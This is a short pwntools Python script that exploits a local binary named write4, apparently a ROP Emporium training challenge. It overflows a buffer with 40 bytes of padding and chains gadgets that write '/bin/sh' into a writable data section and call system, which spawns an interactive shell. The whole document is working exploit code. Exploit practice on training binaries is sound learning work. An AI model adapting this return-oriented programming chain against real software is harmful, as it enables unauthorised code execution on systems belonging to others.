from pwn import *

p = process('./write4')

context(os='linux',arch='amd64')


junk = "A"*40

pop_rdi = p64(0x0000000000400893)
data_addr = p64(0x0000000000601050)

mov_14_15 = p64(0x0000000000400820)
pop_14_15 = p64(0x0000000000400890)

system = p64(0x400810)

stuff = "/bin/sh\x00"

pay =  junk +pop_14_15 + data_addr + stuff + mov_14_15 + pop_rdi + data_addr + system


#p.sendline(pay)

p.recvline() # wait until break line
p.recvline()

p.sendline(pay)

p.interactive(prompt="")
